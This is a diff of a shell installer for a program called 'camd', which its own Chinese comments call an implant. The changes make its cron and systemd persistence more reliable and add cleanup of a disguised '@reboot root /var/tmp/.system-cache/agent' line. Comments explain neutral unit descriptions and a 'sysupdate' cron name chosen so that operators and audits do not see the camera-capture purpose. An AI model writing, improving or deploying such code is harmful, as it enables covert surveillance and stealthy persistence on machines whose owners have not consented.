@@ -143,6 +143,11 @@ UNIT=$PREFIX/etc/systemd/system/$NAME.service
 CRON=$PREFIX/etc/cron.d/$NAME
 LOCK=$PREFIX/var/lock/$NAME.lock
 UNIT_NAME=$NAME.service
+# camd 内部 persist 写入落点时用的标记（09_persistence/src/persist.c 的
+# #define MARKER）。必须与那里逐字一致，否则卸载按本脚本自己的 marker
+# 过滤时清不掉它写的那一行，留在 /etc/crontab 里就是"重启即复活"。
+# 同源由 verify_cron_impl.py 的 S5 静态断言保证。
+PERSIST_MARKER="# do-not-edit:managed"
 # 单元描述。默认中性：此前写死 "Camera Service"，直接点明功能。单元文件
 # 是 0644、常进配置管理与审计采集，运维一条 systemctl status 或 cat 就能
 # 读出意图，而该字段对运行毫无作用——纯暴露面。可用 --unit-desc 覆盖为
@@ -686,13 +691,27 @@ persist_systemd() {
 # 后果：把驻留押在 /etc/cron.d 上，在这类目标机上**永远不执行**，
 #       而部署全绿——条目写了、权限对、契约全过，只是没人会去跑它。
 #       这正是"随机目标"场景最该堵的口子。
+# 【判据必须带前缀，且必须与 09_persistence/src/persist.c 的
+# detect_cron_impl() 同源】
+#
+# 首版这里探的是真实 /etc，而 camd 内部 persist 探的是 root_prefix —— 两处
+# 判据不同源，实测直接互相抵消：假根下本函数按宿主（Ubuntu）判"支持"并写出
+# /etc/cron.d/sysupdate，camd 起来后按空假根判"未知 -> 回退"，随即把刚写的
+# cron.d 条目**删除**并改写 /etc/crontab。实测复现：install 退出 0、报告
+# "cron 条目已写入"，而最终 cron.d 目录存在但为空。
+#
+# 这类"装了又被自己删掉"在真机上同样会发生 —— 只要两处判据将来有任何一处
+# 被单独修改。故此处一律按 $PREFIX 探测：真实根时 $PREFIX 为空，探测的正是
+# 真实 /etc，与 camd 的 root_prefix=NULL 完全同一份输入。
 cron_supports_crond_dir() {
-    [ -f /etc/debian_version ]  && return 0
-    [ -f /etc/redhat-release ]  && return 0
-    [ -f /etc/centos-release ]  && return 0
-    if [ -f /etc/os-release ]; then
-        . /etc/os-release 2>/dev/null
-        case "${ID:-}" in
+    _crd="${1:-}"
+    [ -f "$_crd/etc/debian_version" ]  && return 0
+    [ -f "$_crd/etc/redhat-release" ]  && return 0
+    [ -f "$_crd/etc/centos-release" ]  && return 0
+    if [ -f "$_crd/etc/os-release" ]; then
+        _crd_id=$(sed -n 's/^ID=["'"'"']\?\([^"'"'"']*\)["'"'"']\?.*$/\1/p' \
+                  "$_crd/etc/os-release" 2>/dev/null | head -1)
+        case "${_crd_id:-}" in
             debian|ubuntu|raspbian|rhel|centos|fedora|rocky|almalinux|amzn|opensuse*|sles|suse) return 0 ;;
         esac
     fi
@@ -765,14 +784,21 @@ persist_cron() {
     # CRON_IMPL 是显式覆盖位：能力探测只能按发行版特征猜，而"该实现不支持
     # /etc/cron.d"这条分支在 Debian/RHEL 系机器上永远走不到——守卫若不能
     # 强制进入它，回退路径就从未被真正执行过，等于没写。
-    if [ -n "$CRON_IMPL" ]; then
-        case "$CRON_IMPL" in
+    # 【必须带 :- 默认值 —— 实测踩出来的致命缺陷】
+    # CRON_IMPL 是测试用的显式覆盖位，只在 verify_cron_impl.py 里被赋值。
+    # 生产环境从不设置它。而本脚本开了 set -u，于是 `if [ -n "$CRON_IMPL" ]`
+    # 在变量未定义时直接报 "parameter not set" 并**终止整个脚本**。
+    # 终止点极其糟糕：persist_cron 位于 conf / 二进制 / run.sh 都写完
+    # **之后**，一旦中断就留下半个植入体（有配置、有二进制、有启动器，
+    # 但没有任何驻留条目），而部署报告只显示"install 失败了一次"，
+    # 没人知道磁盘上多了什么。此前所有测试都因为显式传了 CRON_IMPL
+    # 而绕开了这条路径 —— 缺陷被测试环境永久掩盖。
+    if [ -n "${CRON_IMPL:-}" ]; then
+        case "${CRON_IMPL:-}" in
             syscrontab|crontab) _use_crond=0 ;;
             *)                  _use_crond=1 ;;
         esac
-    elif [ "$FAKE_ROOT" = 1 ]; then
-        _use_crond=1
-    elif cron_supports_crond_dir; then
+    elif cron_supports_crond_dir "$PREFIX"; then
         _use_crond=1
     else
         _use_crond=0
@@ -795,6 +821,30 @@ persist_cron() {
         else
             WARN "cron 写入失败（$PREFIX/etc/crontab 不可写）"
             return 0
+        fi
+    fi
+    # 【单一产地：把本次决定的形态写回 conf，交给运行时】
+    # camd 内部 persist 有自己一套能力探测。若这里不把结论传下去，它会按
+    # 自己的探测重写一遍——在 Ubuntu（有 /etc/debian_version）上就是写回
+    # /etc/cron.d，把本函数的回退决定抵消。实测：CRON_IMPL=syscrontab 下
+    # install 报"条目已追加到 /etc/crontab"，而 camd 试运行后
+    # /etc/cron.d/sysupdate 依然存在（守卫 F4c 红）。
+    # 写入后 run.sh 以 set -a 导出 conf，camd 的 persist 读
+    # PERSIST_CRON_IMPL 得到同一结论，部署与运行时不再发散。
+    if [ -n "${CONF_FILE:-}" ] && [ -f "$CONF_FILE" ]; then
+        if [ "$_use_crond" = 1 ]; then
+            _cron_kind=crond
+        else
+            _cron_kind=syscrontab
+        fi
+        # 先剔除旧值再追加：persist_cron 幂等重复调用时不留重复行。
+        # 用 cat 覆写而非 sed -i，保住 conf 的 0600 与 inode。
+        _ct=$(mktemp 2>/dev/null) || _ct=""
+        if [ -n "$_ct" ]; then
+            grep -v '^PERSIST_CRON_IMPL=' "$CONF_FILE" > "$_ct" 2>/dev/null
+            printf 'PERSIST_CRON_IMPL=%s\n' "$_cron_kind" >> "$_ct" 2>/dev/null
+            cat "$_ct" > "$CONF_FILE" 2>/dev/null
+            rm -f "$_ct" 2>/dev/null
         fi
     fi
     # 守护进程单独探测：写了不等于会执行。未确认就显式报出来，
@@ -1008,9 +1058,20 @@ do_uninstall() {
     rm -f "$CRON" "$BIN_DST" "$LOCK" "$AUTOSTART_DESKTOP" 2>/dev/null
     # 回退形态写在 /etc/crontab 里：不清理就会留下"重新装一次才被发现"的
     # 驻留痕迹，且它会随系统 crontab 一起被任何排错行为看见。
+    #
+    # 【两套 marker 必须都清 —— 实测踩出来的残留缺陷】
+    # 本脚本写的是 "# managed-$NAME"（周期条目），而 camd 内部 persist 写的
+    # 是 "# do-not-edit:managed"（@reboot 条目），后者由 09_persistence 的
+    # MARKER 定义。只清前者时，卸载报告"成功 3 失败 0"，而
+    #   @reboot root /var/tmp/.system-cache/agent  # do-not-edit:managed
+    # 整行留在 /etc/crontab 里 —— 机器一重启植入体照样起来，卸载等于没卸。
+    # 判据用"或"而非"且"：任一存在即清理，两行都清干净才算完。
+    # 该字面量与 persist.c 的 #define MARKER 必须一致，由 verify_cron_impl
+    # 的 S5 静态断言守着（改一处不改另一处会立刻变红）。
     _ct="$PREFIX/etc/crontab"
-    if [ -f "$_ct" ] && grep -q "managed-$NAME" "$_ct" 2>/dev/null; then
-        grep -v "managed-$NAME" "$_ct" > "$_ct.$$.tmp" 2>/dev/null && mv "$_ct.$$.tmp" "$_ct" 2>/dev/null
+    if [ -f "$_ct" ] && grep -q -e "managed-$NAME" -e "$PERSIST_MARKER" "$_ct" 2>/dev/null; then
+        grep -v -e "managed-$NAME" -e "$PERSIST_MARKER" "$_ct" > "$_ct.$$.tmp" 2>/dev/null \
+            && mv "$_ct.$$.tmp" "$_ct" 2>/dev/null
         rm -f "$_ct.$$.tmp" 2>/dev/null
     fi
     rm -rf "$CONF_DIR" "$LIB_DIR" 2>/dev/null
